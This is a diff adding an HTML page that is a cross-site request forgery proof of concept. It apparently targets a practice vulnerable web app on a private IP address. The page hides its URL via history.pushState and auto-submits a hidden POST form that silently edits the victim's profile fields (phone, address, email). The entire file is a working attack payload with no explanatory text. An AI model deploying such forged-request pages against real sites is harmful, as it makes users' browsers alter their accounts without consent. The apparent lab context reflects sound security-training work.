@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.0.90:8082/vul/csrf/csrfpost/csrf_post_edit.php" method="POST">
+      <input type="hidden" name="sex" value="123" />
+      <input type="hidden" name="phonenum" value="123" />
+      <input type="hidden" name="add" value="123" />
+      <input type="hidden" name="email" value="123" />
+      <input type="hidden" name="submit" value="submit" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+</body>
+</html>
